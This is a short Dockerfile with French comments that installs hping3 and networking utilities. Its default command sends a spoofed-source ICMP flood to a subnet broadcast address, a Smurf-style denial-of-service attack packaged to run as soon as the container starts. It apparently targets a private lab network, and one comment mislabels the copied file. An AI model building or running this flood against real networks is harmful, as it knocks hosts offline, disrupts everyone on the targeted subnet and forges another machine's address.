# Utilisez une image de base appropriée
FROM ubuntu:latest

WORKDIR /app
# Mettez à jour les paquets existants et installez les dépendances nécessaires
RUN apt-get update && apt-get install -y hping3
RUN apt-get install net-tools
RUN apt-get install -y iputils-ping
RUN apt install iproute2 -y

# Copie du fichier requirements.txt
COPY notes.txt /app/notes.txt
# Définissez l'entrée de commande pour exécuter la commande souhaitée
CMD ["hping3", "-a", "192.168.2.10", "-1", "--flood", "192.168.2.255"]


